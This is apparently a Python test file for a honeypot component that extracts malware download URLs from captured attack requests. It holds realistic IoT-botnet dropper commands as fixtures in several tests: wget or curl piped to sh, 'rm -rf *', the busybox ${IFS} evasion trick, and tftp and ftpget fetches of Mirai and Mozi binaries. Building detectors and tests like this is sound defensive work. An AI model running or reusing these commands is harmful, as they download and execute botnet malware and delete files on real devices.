"""Download URLs found in captured requests. Real payload shapes first, then everything a
hostile request could do to the extractor."""
import random
import time
import unittest

from uninvited import droppers
from uninvited.droppers import clean, decode, extract


def urls(text):
    return [d.url for d in extract(text)]


class RealPayloadTests(unittest.TestCase):
    def test_the_mozi_request_seen_on_the_live_site(self):
        path = "/board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://175.107.3.233:43777/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+varcron"
        found = extract(decode(path))
        self.assertEqual([(d.url, d.host, d.port, d.file, d.family) for d in found],
                         [("http://175.107.3.233:43777/Mozi.a", "175.107.3.233", 43777, "Mozi.a", "Mozi")])

    def test_hikvision_style_command_in_a_body(self):
        body = b'<?xml version="1.0"?><language>$(wget http://45.9.148.5/x/bins.sh -O- | sh)</language>'
        self.assertEqual(urls(decode("/SDK/webLanguage", {}, body)), ["http://45.9.148.5/x/bins.sh"])

    def test_curl_with_options_and_a_pipe(self):
        self.assertEqual(urls("; curl -s -k -o /tmp/a.sh https://45.9.148.5:8443/a.sh|sh"), ["https://45.9.148.5:8443/a.sh"])

    def test_busybox_wget_and_the_ifs_trick(self):
        self.assertEqual(urls(decode("/x?c=cd${IFS}/tmp;/bin/busybox${IFS}wget${IFS}http://45.9.148.5/mirai.arm7;sh${IFS}mirai.arm7")),
                         ["http://45.9.148.5/mirai.arm7"])
        self.assertEqual(extract("busybox wget http://45.9.148.5/mirai.arm7")[0].family, "Mirai")

    def test_a_payload_encoded_twice(self):
        self.assertEqual(urls(decode("/x?c=wget%2520http%253A%252F%252F45.9.148.5%252Fa.sh")), ["http://45.9.148.5/a.sh"])

    def test_tftp_in_its_common_shapes(self):
        self.assertEqual(urls("tftp -g -r bins.sh 45.9.148.5"), ["tftp://45.9.148.5/bins.sh"])
        self.assertEqual(urls("tftp -l /tmp/b -r bins.sh -g 45.9.148.5"), ["tftp://45.9.148.5/bins.sh"])
        self.assertEqual(urls("tftp 45.9.148.5 -c get bins.sh"), ["tftp://45.9.148.5/bins.sh"])
        self.assertEqual(urls("tftp -g -r bins.sh"), [])

    def test_ftpget_keeps_no_credentials(self):
        got = urls("ftpget -v -u anonymous -p hunter2 -P 2121 45.9.148.5 a.sh remote/a.sh")
        self.assertEqual(got, ["ftp://45.9.148.5:2121/remote/a.sh"])
        self.assertNotIn("hunter2", "".join(got))

    def test_several_downloads_in_one_request_keep_their_order(self):
        text = "wget http://45.9.148.5/a; wget http://45.9.148.6/b; curl http://45.9.148.7/c"
        self.assertEqual(urls(text), ["http://45.9.148.5/a", "http://45.9.148.6/b", "http://45.9.148.7/c"])

    def test_at_most_five_and_no_repeats(self):
        text = ";".join(f"wget http://45.9.148.{i}/x" for i in range(1, 20))
        self.assertEqual(len(extract(text)), droppers.MAX_URLS)
        self.assertEqual(urls("wget http://45.9.148.5/a;wget http://45.9.148.5/a"), ["http://45.9.148.5/a"])


class WhatIsNotADropperTests(unittest.TestCase):
    def test_a_url_with_no_download_command_is_ignored(self):
        for text in ("GET http://45.9.148.5/x HTTP/1.1", "Referer: http://45.9.148.5/", "url=http://45.9.148.5/shell.php",
                     "http://45.9.148.5/a.sh", "xwget http://45.9.148.5/a"):
            self.assertEqual(urls(text), [], text)

    def test_private_and_local_hosts_are_refused(self):
        for host in ("10.0.0.5", "192.168.1.9", "127.0.0.1", "169.254.1.1", "172.16.0.1", "100.64.0.1", "0.0.0.0",
                     "224.0.0.1", "[::1]", "[fe80::1]", "[fd00::1]", "localhost", "printer.local", "nas.lan",
                     "router.home", "single", "203.0.113.9", "198.51.100.1"):
            self.assertEqual(urls(f"wget http://{host}/x"), [], host)

    def test_public_hosts_are_kept(self):
        for host in ("45.9.148.5", "example.org", "cdn.sub.example.co.uk", "xn--nxasmq6b.example.com", "[2606:4700::1111]"):
            self.assertEqual(len(urls(f"wget http://{host}/x")), 1, host)

    def test_other_schemes_are_refused(self):
        for scheme in ("file", "gopher", "javascript", "data", "ssh", "ldap", "dict", "smb"):
            self.assertEqual(urls(f"wget {scheme}://45.9.148.5/x"), [], scheme)

    def test_bad_ports_are_refused(self):
        for port in (0, 65536, 99999, "abc", -1):
            self.assertEqual(urls(f"wget http://45.9.148.5:{port}/x"), [], port)

    def test_things_that_are_not_text_a_url_can_be(self):
        for raw in ("wget http://45.9.148.5/\x01x", "wget http://45.9.148.5/š", "wget http://45.9.148.5/" + "a" * 400,
                    "wget http://exa mple.org/x", "wget http://.example.org/x", "wget http:///x", "wget http://",
                    "wget http://-bad-.example.org/x", "wget http://a..b.example.org/x"):
            self.assertEqual(urls(raw), [], raw[:60])


class CanonicalFormTests(unittest.TestCase):
    def test_scheme_and_host_are_lower_case_and_default_ports_drop(self):
        self.assertEqual(clean("HTTP://EXAMPLE.ORG:80/Path?Q=1#frag").url, "http://example.org/Path?Q=1")
        self.assertEqual(clean("https://example.org:443").url, "https://example.org/")
        self.assertEqual(clean("http://example.org:8080/a").url, "http://example.org:8080/a")

    def test_credentials_and_quotes_are_stripped(self):
        self.assertEqual(clean("'http://admin:hunter2@45.9.148.5/a.sh';").url, "http://45.9.148.5/a.sh")
        self.assertNotIn("hunter2", clean("http://admin:hunter2@45.9.148.5/a.sh").url)

    def test_the_file_name_is_made_safe_and_the_family_guessed_from_whole_words(self):
        self.assertEqual(clean("http://45.9.148.5/a%2Fb/Mozi.m").family, "Mozi")
        self.assertEqual(clean("http://45.9.148.5/sora.mips").family, "Sora")
        self.assertIsNone(clean("http://45.9.148.5/assorted.sh").family)
        self.assertIsNone(clean("http://45.9.148.5/bins.sh").family)
        self.assertEqual(clean("http://45.9.148.5/<script>.sh").file, "script.sh")

    def test_ipv6_keeps_its_brackets(self):
        self.assertEqual(clean("http://[2606:4700::1111]:8080/x").url, "http://[2606:4700::1111]:8080/x")


class HostileInputTests(unittest.TestCase):
    def test_random_text_never_raises_and_every_result_is_valid(self):
        rnd = random.Random(7)
        alphabet = "wgetcurlftp:/;|&$(){}`'\"<> .-_%0123456789abcxyz\r\n\t\x00š[]@?=#"
        for _ in range(4000):
            text = "".join(rnd.choice(alphabet) for _ in range(rnd.randrange(0, 400)))
            for d in extract(decode(text, {"x": text[:50]}, text.encode()[:100])):
                self.assertLessEqual(len(d.url), droppers.MAX_URL)
                self.assertEqual(clean(d.url), d)                    # canonical: cleaning it again changes nothing
                self.assertTrue(d.url.isascii() and " " not in d.url)

    def test_mutated_real_payloads_never_raise(self):
        rnd = random.Random(8)
        seeds = ["cd /tmp;wget http://45.9.148.5:81/Mozi.a;sh Mozi.a", "tftp -g -r a.sh 45.9.148.5", "curl -O http://x.example.org/a|sh",
                 "ftpget -u a -p b 45.9.148.5 a b"]
        for _ in range(3000):
            s = list(rnd.choice(seeds))
            for _ in range(rnd.randrange(1, 6)):
                i = rnd.randrange(len(s) + 1)
                if rnd.random() < 0.5 and s:
                    del s[min(i, len(s) - 1)]
                else:
                    s.insert(i, rnd.choice(";|&$(){}`'\"<> \x00%/:@[]š"))
            for d in extract("".join(s)):
                self.assertEqual(clean(d.url), d)

    def test_the_work_is_linear_in_the_size_of_the_text(self):
        # No pattern here can backtrack, so the worst inputs cost the same as ordinary ones.
        nasty = ["wget " * 4000, ";" * 9000, "wget http://" + "a." * 3000, "(" * 9000, "tftp -r " * 2000,
                 "wget " + "http://45.9.148.5/" * 400, "$(" * 4000, "%25" * 4000]
        start = time.time()
        for text in nasty:
            extract(decode(text))
        self.assertLess(time.time() - start, 2.0)

    def test_only_the_start_of_a_huge_request_is_read(self):
        text = " " * (droppers.MAX_TEXT + 100) + "wget http://45.9.148.5/late"
        self.assertEqual(urls(text), [])


if __name__ == "__main__":
    unittest.main()
